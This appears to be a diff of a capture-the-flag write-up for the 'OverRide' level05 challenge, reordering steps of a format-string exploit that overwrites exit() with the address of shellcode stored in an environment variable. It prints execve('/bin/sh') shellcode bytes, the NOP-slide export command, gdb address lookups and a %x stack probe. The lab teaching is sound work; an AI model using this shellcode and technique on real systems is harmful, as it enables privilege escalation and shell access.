@@ -33,13 +33,6 @@ We also see a call to ```exit()```.
 
 ### Build exploit
 
-Let's start by checking our buffer position with a printf() string format exploit.
-We can see our buffer "AAAA" in the 10th position on the stack as 61616161.
-```
-level05@OverRide:~$ python -c 'print "AAAA"+" %x"*12' | ./level05
-aaaa 64 f7fcfac0 f7ec3af9 ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 61616161 20782520 25207825
-```
-
 Unfortunately, we see the stack is non-executable. 
 
 We can overflow the buffer, but we can't overwrite the EIP with an address (like ```system("/bin/sh")```) in the stack because it won't execute.
@@ -48,7 +41,9 @@ level05@OverRide:~$ dmesg | grep "Execute Disable"
 [    0.000000] NX (Execute Disable) protection: active
 ```
 
-Instead, we will use [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php).
+Instead, we will use a shellcode stored in an environmental variable to run a string format attack to overwrite ```exit()```. 
+
+We will use [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php).
 ```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 ```
@@ -57,7 +52,7 @@ We will prefix the shellcode with a 100 byte NOP slide, and then store it all in
 level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
 ```
 
-Let's find the address of our malicious environment variable. 
+Let's find the address of our malicious shellcode / environment variable. 
 ```
 (gdb) break *main+4
 Breakpoint 1 at 0x8048448
@@ -102,9 +97,16 @@ level05@OverRide:~$ gdb -q level05
 ```
 We will also have to split the address of ```exit()``` in two, to accomodate our hefty 2-part shellcode address. 
 
-Let's sum it all up! 
+Finally, let's check our buffer position for the printf() string format exploit.
+We can see our buffer "AAAA" in the 10th position on the stack as 61616161.
+```
+level05@OverRide:~$ python -c 'print "AAAA"+" %x"*12' | ./level05
+aaaa 64 f7fcfac0 f7ec3af9 ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 61616161 20782520 25207825
+```
 
-So our attack takes place in 2 steps:
+Looks good... Let's sum it all up! 
+
+Our attack takes place in 2 steps:
 - malicious environment variable 
 ```
 "NOP slide [100 bytes] + call to open a shell"
